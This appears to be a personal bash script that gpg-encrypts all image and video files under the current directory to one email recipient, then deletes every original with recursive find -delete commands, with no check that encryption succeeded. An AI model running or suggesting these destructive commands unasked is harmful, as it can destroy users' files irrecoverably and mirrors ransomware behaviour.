recep='samir.benzammour@gmail.com'

command="gpg -r $recep --encrypt-files *{.png,.jpg,.jpeg,.gif,.mp4,.JPG,.PNG,.mov,.MOV,.JPEG,.MP4,.GIF}"

find . -type d -exec bash -c "cd '{}' && $command" \;

sleep .1

find . -name '*.jpg' -delete
find . -name '*.jpeg' -delete
find . -name '*.png' -delete
find . -name '*.mp4' -delete
find . -name '*.gif' -delete
find . -name '*.mov' -delete
find . -name '*.JPG' -delete
find . -name '*.JPEG' -delete
find . -name '*.PNG' -delete
find . -name '*.MP4' -delete
find . -name '*.GIF' -delete
find . -name '*.MOV' -delete
